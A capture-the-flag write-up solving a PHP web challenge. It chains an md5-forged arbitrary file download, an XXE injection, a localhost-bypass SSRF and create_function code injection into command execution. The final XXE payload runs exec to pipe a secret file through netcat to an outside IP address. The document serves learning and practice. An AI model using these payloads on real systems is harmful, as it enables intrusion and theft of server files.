# Bad injections

## Prologue
This was a hard challenge for me, I banged my head a bit, but, all in all, I learned a lot, so thanks for this fun challenge!
## Enumerating the challenge
![Home page](https://i.imgur.com/dcBUrkd.png)
On the website we don't see much, except four tabs. The home, about, contact pages don't have anything of interesting. The contact page injection is a rabbit hole.

In the list source code we see:
```
download?file=files/test.txt&hash=293d05cb2ced82858519bdec71a0354b
```
The hash is md5, so that gives us file retrieval from anywhere in the server, using a script:
```
import requests
import hashlib
import sys

dfile = sys.argv[1]
m = hashlib.md5()
m.update(dfile)
dhash = m.hexdigest()
print "downloading file: {0}, md5sum: {1}".format(dfile, dhash)
print "http://68.183.31.62:94/download?file={0}&hash={1}".format(dfile, dhash)
c = requests.get("http://68.183.31.62:94/download?file={0}&hash={1}".format(dfile, dhash))
print c.content
```
## XXE injection
In /app/Routes.php we can see:
```
Route::set('custom',function(){
  $handler = fopen('php://input','r');
  $data = stream_get_contents($handler);
  if(strlen($data) > 1){
    Custom::Test($data);
  }else{
    Custom::createView('Custom');
  }
});
```
It takes some input from HTTP request and then passes it on to Custom::Test.
Custom::Test contains:
```
class Custom extends Controller{
  public static function Test($string){
      $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
      $test = $root->name;
      echo $test;
  }

}
 ?>
```
We can use XXE injection to retrieve files (and something else!). Using Burp we can test this.
![XXE injection in Burp](https://i.imgur.com/qGts3y8.png)As we can see the XXE injection is functional. But we can't really do anything with it right now.
## Localhost bypass
Routes.php also contains:
```
Route::set('admin',function(){
  if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
    Admin::createView('Admin');
  }else{
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    }else{
     echo ";(";
    }
  }
});
```
Which checks if you're coming from localhost or from other address and depending on this it either echoes or calls Admin::sort.

Admin::sort contains:
```
     usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
```
Which is an obvious code injection, which we can use. It also contains some other XML stuff, that's easily craftable.

## Everything put together
We use the XXE injection to bypass localhost protection, then make a request to /admin route which then can give us code execution.
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1/admin?rss=http://45.76.39.243/a.xml&order=link.file_get_contents('http://{your_ip}/'.exec('cat'.chr(32).'/da0f72d5d79169971b62a479c34198e7'.chr(124).'/bin/nc'.chr(32).'45.76.39.243'.chr(32).'1234'))">
]>
<root><name>&xxe;</name></root>
```

And we get the flag:
```
f#{1_d0nt_kn0w_wh4t_i4m_d01ng}
```

## Conclusion
This was a really hard challenge for me, but I felt so proud when I solved it. Shout-out to Fireshell for making this great chal.
